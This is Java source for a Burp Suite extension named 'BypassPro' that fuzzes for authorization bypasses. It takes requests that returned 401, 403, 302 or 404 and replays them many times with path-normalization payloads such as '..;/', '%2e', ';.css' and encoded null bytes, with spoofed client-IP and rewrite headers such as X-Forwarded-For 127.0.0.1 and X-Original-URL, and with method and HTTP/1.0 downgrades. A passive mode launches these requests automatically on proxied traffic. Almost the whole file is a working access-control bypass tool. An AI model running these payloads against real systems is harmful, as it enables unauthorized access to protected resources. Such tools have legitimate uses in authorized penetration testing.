package Main;

import burp.*;
import org.apache.commons.lang3.StringUtils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.nio.charset.Charset;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class BypassMain implements IContextMenuFactory ,IProxyListener{

    private final Charset UTF8_CHARSET = Charset.forName("UTF-8");

    public List<BaseRequest> make_suffix(String prefix, String target) {
        List<BaseRequest> baseRequestList = new ArrayList();
        Map<String, String> headers = new HashMap();


        baseRequestList.add(new BaseRequest("GET",  prefix + "/" + target, null));

        baseRequestList.add(new BaseRequest("GET",  prefix + "/%2e/" + target, null));
        baseRequestList.add(new BaseRequest("GET",  prefix + "/" + target + "/.", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "//" + target + "/", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "//" + target, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/./" + target + "/./", null));
        baseRequestList.add(new BaseRequest("GET",   prefix + "/#/../" + target + "/./", null));


        headers.put("X-Custom-IP-Authorization", "127.0.0.1");
        headers.put("X-Forwarded-For", "127.0.0.1");
        headers.put("X-Client-IP", "127.0.0.1");
        headers.put("X-Remote-Addr", "127.0.0.1");
        headers.put("X-Originating-IP", "127.0.0.1");
        headers.put("Referer", "http://127.0.0.1");
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Original-URL", target);
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Forwarded-For", "http://127.0.0.1");
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Forwarded-For", "127.0.0.1:80");
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-rewrite-url", prefix + "/" +target);
        baseRequestList.add(new BaseRequest("GET",   "/" , (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "%20", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" +target + "%09", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "?", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ".html", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "/?error", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "#", null));

        headers.put("Content-Length", "0");
        baseRequestList.add(new BaseRequest("POST",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "/*", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ".json", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ";.css", null));

        baseRequestList.add(new BaseRequest("TRACE",   prefix + "/" + target, null));

        headers.put("X-Host", "127.0.0.1");
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "..;/", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/..;/" + target, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/;/" + target, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/.;/" + target, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + URLParamEncoder.encode(target), null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/images;/../" + target, null));
        baseRequestList.add(new BaseRequest("GET",   prefix + "/images/..;/" + target, null));
        baseRequestList.add(new BaseRequest("GET",   prefix + "/public/..;/" + target, null));

        //Laura_小狮子
        baseRequestList.add(new BaseRequest("GET",  prefix + "/;../" + target, null));
        baseRequestList.add(new BaseRequest("GET",  prefix + "/" + target + "/%26", null));
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ".php", null));
        baseRequestList.add(new BaseRequest("GET",  prefix + "/..%00/" + target, null));
        baseRequestList.add(new BaseRequest("GET",  prefix + "/..%0d/" + target, null));
        baseRequestList.add(new BaseRequest("GET",  prefix + "/..%5c" + target, null));
        //Laura_小狮子

        return baseRequestList;

    }

    public List<BaseRequest> make_prefix(String prefix, String suffix, String target) {
        List<BaseRequest> baseRequestList = new ArrayList();

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ";/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/images/..;/" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/images;/../" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/public/..;/" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",  prefix + "/%2e/" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",  prefix + "/" + target + "/." + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "//" + target + "/" + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "//" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/./" + target + "/./" + suffix, null));


        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "%20" + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" +target + "%09" + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "..;/" + suffix, null));
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "/..;/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/..;/" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/;/" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/.;/" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + URLParamEncoder.encode(target) + "/" + suffix, null));

        return baseRequestList;
    }

    public List<BaseRequest> make_payload(String path) {
        path = path.substring(1);

        Boolean isEnd = false;

        if(path.endsWith("/")) {
            path = path.substring(0, path.length()-1);
            isEnd = true;
        }
        String[] paths = path.split("/");

        String target = "";
        String prefix = "";
        String suffix = "";

        // 对结尾进行fuzz
        target = paths[paths.length-1];
        String[] new_paths = Arrays.copyOfRange(paths, 0, paths.length-1);
        prefix = StringUtils.join(new_paths, "/");
        prefix = "/" + prefix;
        if (prefix.endsWith("/")) {
            prefix = prefix.substring(0, prefix.length()-1);
        }



        List<BaseRequest> allRequests = new ArrayList();

        if(isEnd) {
            allRequests.addAll(make_suffix(prefix, target + "/"));
            allRequests.addAll(make_suffix(prefix, target));
        } else {
            allRequests.addAll(make_suffix(prefix, target));
        }

        // 对负一节点进行fuzz
        if (paths.length > 1) {
            suffix = paths[paths.length-1];
            target = paths[paths.length-2];

            if (paths.length == 2) {
                prefix = "";
            }else if (paths.length > 2) {
                String[] prefix_paths = Arrays.copyOfRange(paths, 0, paths.length-2);
                prefix = StringUtils.join(prefix_paths, "/");

                prefix = "/" + prefix;
                if (prefix.endsWith("/")) {
                    prefix = prefix.substring(0, prefix.length()-1);
                }

            }


            allRequests.addAll(make_prefix(prefix, suffix, target));
        }

        return allRequests;

    }

    public List<BaseRequest> make_payload_v2(String path) {
        path = path.substring(1);

        Boolean isEnd = false;

        if(path.endsWith("/")) {
            path = path.substring(0, path.length()-1);
            isEnd = true;
        }
        String[] paths = path.split("/");

        List<BaseRequest> allRequests = new ArrayList();

        if(isEnd) {
            allRequests.addAll(make_suffix_v2(path));
            allRequests.addAll(make_suffix_v2(path + "/"));
        } else {
            allRequests.addAll(make_suffix_v2(path));
        }

        // 对前置节点进行FUZZ
        if( paths.length > 1) {
            int paths_len = paths.length;
            if (isEnd) {
                allRequests.addAll(make_prefix_v2(paths, paths_len, "/"));
            } else {
                allRequests.addAll(make_prefix_v2(paths, paths_len, ""));
            }
        }

        return allRequests;

    }

    public List<BaseRequest> make_suffix_v2(String path) {
        List<BaseRequest> baseRequestList = new ArrayList();
        Map<String, String> headers = new HashMap();


        baseRequestList.add(new BaseRequest("GET",  "/" + path + ".js", null));
        baseRequestList.add(new BaseRequest("GET",  "/" + path + ".css", null));
        baseRequestList.add(new BaseRequest("GET",  "/" + path + ".json", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + ".html", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + ";.css", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + ";.js", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + "/.", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + "/", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + "/./", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + "%20", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + "%09", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + "?", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + "?error", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + "#", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + "/*", null));
        baseRequestList.add(new BaseRequest("GET",   "/" + path + "%26", null));


        headers.put("X-Custom-IP-Authorization", "127.0.0.1");
        headers.put("X-Forwarded-For", "127.0.0.1");
        headers.put("X-Client-IP", "127.0.0.1");
        headers.put("X-Remote-Addr", "127.0.0.1");
        headers.put("X-Originating-IP", "127.0.0.1");
        headers.put("Referer", "http://127.0.0.1");
        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Original-URL", path);
        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Forwarded-For", "http://127.0.0.1");
        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Forwarded-For", "127.0.0.1:80");
        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Host", "127.0.0.1");
        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        // http/1.0 无头协议绕过
        headers.put("HTTP-Version", "HTTP/1.0");
        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        return baseRequestList;

    }

    public List<BaseRequest> make_prefix_v2(String[] paths, int paths_len, String end) {
        List<BaseRequest> baseRequestList = new ArrayList();

        for (int i=0; i < paths_len; i++) {
            String _target = paths[i];
            String new_path = "";

            paths[i] = URLParamEncoder.encode(_target);
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = _target + ";";
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = _target + "/..;";
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = "images;/../" + _target;
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = "%2e/" + _target;
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = ";/" + _target;
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = "./" + _target;
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = "/" + _target;
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = _target + "%20";
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = _target + "%09";
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = ".;/" + _target;
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = "..%00/" + _target;
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = "..%0d/" + _target;
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = "..%5c/" + _target;
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = "#/../" + _target;
            new_path = StringUtils.join(paths, "/") + end;
            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));

            paths[i] = _target;

        }

        return baseRequestList;
    }


    class Run_request implements Runnable {
        private BaseRequest baseRequest;
        private String old_path;
        private String old_request;
        private String old_method;
        private IHttpRequestResponse iHttpRequestResponse;
        private String tool;

        public Run_request(BaseRequest baseRequest, String old_path, String old_request, String old_method,IHttpRequestResponse iHttpRequestResponse, String tool) {
            this.baseRequest = baseRequest;
            this.old_method = old_method;
            this.old_path = old_path;
            this.old_request = old_request;
            this.iHttpRequestResponse = iHttpRequestResponse;
            this.tool=tool;
        }

        @Override
        public void run() {

            String method = baseRequest.method;
            String path = baseRequest.path;
            Map<String, String> headers = baseRequest.headers;
            String new_request = "";

            new_request = old_request.replaceFirst(old_path, path);
            if (method == "GET") {
                if (headers != null) {
                    new_request = old_request.replaceFirst(old_path, path);

                    for(Map.Entry<String, String> map: headers.entrySet()) {
                        String key = map.getKey();
                        String value = map.getValue();
                        // ---------------------------------------------
                        // 无headers的处理
                        if (key.equals("HTTP-Version"))
                        {

                            new_request = new_request.replaceFirst("HTTP/1.1","HTTP/1.0");
                            // 后面的headers都不要
                            new_request = String.valueOf(new_request.split("\r\n"));
                            break;
                        }
                        // ----------------------------
                        new_request = new_request.replaceFirst("User-Agent: ", key + ": " + value + "\r\nUser-Agent: ");
                    }

                }
            } else if(method == "POST"){
                if(old_method == "GET") {
                    new_request = old_request.replaceFirst("GET", "POST");
                } else if (old_method == "POST") {
                    new_request = old_request.replaceFirst("POST", "GET");
                }

            } else if (method == "TRACE") {
                if(old_method == "GET") {
                    new_request = old_request.replaceFirst("GET", "TRACE");
                } else if (old_method == "POST") {
                    new_request = old_request.replaceFirst("POST", "TRACE");
                }
            }

            try {
                IHttpRequestResponse resRequestReponse = Utils.callbacks.makeHttpRequest(iHttpRequestResponse.getHttpService(), Utils.helpers.stringToBytes(new_request));


                String old_response = new String(iHttpRequestResponse.getResponse(), "utf-8");
                String new_response = new String(resRequestReponse.getResponse(), "utf-8");
                short old_status = Utils.helpers.analyzeResponse(iHttpRequestResponse.getResponse()).getStatusCode();
                short new_status = Utils.helpers.analyzeResponse(resRequestReponse.getResponse()).getStatusCode();

                //Utils.panel.addFinishRequestNum(1);
                addFinishRequestNum(1);

                if (resRequestReponse != null && (DiffPage.getRatio(old_response, new_response) <=1 )   )
                {
                    String title = Utils.getBodyTitle(new_response);
                    addLog(resRequestReponse, 0, 0, 0, title,tool);
                }


            }catch(Throwable ee) {
                Utils.panel.addErrorRequestNum(1);

            }
        }
    }


    @Override
    // 右键添加菜单
    public List<JMenuItem> createMenuItems(final IContextMenuInvocation invocation) {
        List<JMenuItem> list;
        list = new ArrayList<JMenuItem>();

        if(invocation != null && invocation.getSelectedMessages() != null && invocation.getSelectedMessages()[0] != null && invocation.getSelectedMessages()[0].getHttpService() != null) {
            JMenuItem jMenuItem = new JMenuItem("Send to BypassPro");

            jMenuItem.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent e) {


                    new Thread(() -> {
                        IHttpRequestResponse[] iHttpRequestResponses = invocation.getSelectedMessages();
                        processHttp(iHttpRequestResponses,"active");
                    }).start();

                }
            });
            list.add(jMenuItem);
        }
        return list;
    }

    private void addLog(IHttpRequestResponse messageInfo, int toolFlag, long time, int row, String title, String tool) {
        short statusCode = Utils.helpers.analyzeResponse(messageInfo.getResponse()).getStatusCode();
        // 405请求方法错误  415 content-type错误
        if(statusCode == 200 || statusCode == 405 || statusCode == 415 ) {
            Utils.panel.getBypassTableModel().getBypassArray().add(new Bypass(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss").format(LocalDateTime.now()),
                    Utils.helpers.analyzeRequest(messageInfo).getMethod(),
                    String.valueOf(messageInfo.getResponse().length),
                    Utils.callbacks.saveBuffersToTempFiles(messageInfo),
                    Utils.helpers.analyzeRequest(messageInfo).getUrl(),
                    Utils.helpers.analyzeResponse(messageInfo.getResponse()).getStatusCode(),
                    Utils.helpers.analyzeResponse(messageInfo.getResponse()).getStatedMimeType(),
                    title,
                    Utils.count++, tool));
            Utils.panel.getBypassTableModel().fireTableRowsInserted(row, row);
        }
    }


    private static synchronized void addAllRequestNum(int num) {
        Utils.panel.addAllRequestNum(num);
    }
    private static synchronized  void addFinishRequestNum(int num) {
        Utils.panel.addFinishRequestNum(1);
    }
//    public void setThread_num(int number) {
//        thread_num = number;
//    }

    public void processHttp(IHttpRequestResponse[] iHttpRequestResponses, String tool) {

        for(IHttpRequestResponse iHttpRequestResponse : iHttpRequestResponses) {
            String old_path = Utils.helpers.analyzeRequest(iHttpRequestResponse).getUrl().getPath();
            String old_request = Utils.helpers.bytesToString(iHttpRequestResponse.getRequest());
            String old_method = Utils.helpers.analyzeRequest(iHttpRequestResponse).getMethod();
            IResponseInfo response = Utils.helpers.analyzeResponse(iHttpRequestResponse.getResponse());

            List<BaseRequest> allRequests;
            allRequests = make_payload_v2(old_path);

            int thread_num = Utils.panel.getThreadNum();


            Utils.out("start thread, number: " + String.valueOf(thread_num) + " path: " + old_path);
            ExecutorService es = Executors.newFixedThreadPool(thread_num);

            //计算请求数量
            //Utils.panel.addAllRequestNum(allRequests.size());
            addAllRequestNum(allRequests.size());
            for(BaseRequest baseRequest: allRequests) {

                es.submit(new BypassMain.Run_request(baseRequest, old_path, old_request, old_method, iHttpRequestResponse,tool));

            }
            es.shutdown();
        }

    }

    // 做被动扫描
    @Override
    public void processProxyMessage(boolean messageIsRequest, IInterceptedProxyMessage message) {

            if (Utils.isSelected && !messageIsRequest) {
                IHttpRequestResponse httpRequestResponse = message.getMessageInfo();
                byte[] old_response  = httpRequestResponse.getResponse();
                //if(old_response != null)
                {
                    short old_status = Utils.helpers.analyzeResponse(old_response).getStatusCode();
                    String path = Utils.helpers.analyzeRequest(httpRequestResponse).getUrl().getPath();
                    IHttpRequestResponse[] iHttpRequestResponses = new IHttpRequestResponse[]{httpRequestResponse};

                    if ((old_status == 302 || old_status == 401 || old_status == 403 || old_status == 404)) {
                        if (path.lastIndexOf(".") > -1) {  // 有后缀的情况

                            String extension = path.substring(path.lastIndexOf(".") + 1);
                            if ((extension.equals("js") || extension.equals("css") || extension.equals("png") || extension.equals("gif") || extension.equals("jpg") || extension.equals("mp4") || extension.equals("mp3") || extension.equals("tif") || extension.equals("swf") || extension.equals("wmv") || extension.equals("map")
                                    || extension.equals("zip") || extension.equals("exe") || extension.equals("so") || extension.equals("rar") || extension.equals("gz") || extension.equals("iso") || extension.equals("avi") || extension.equals("pdf") || extension.equals("doc"))) {
                                    return;
                            }
                        }
                            new Thread(() ->
                            {
                                processHttp(iHttpRequestResponses, "passive");
                            }).start();

                    }

                }
            }

    }

}
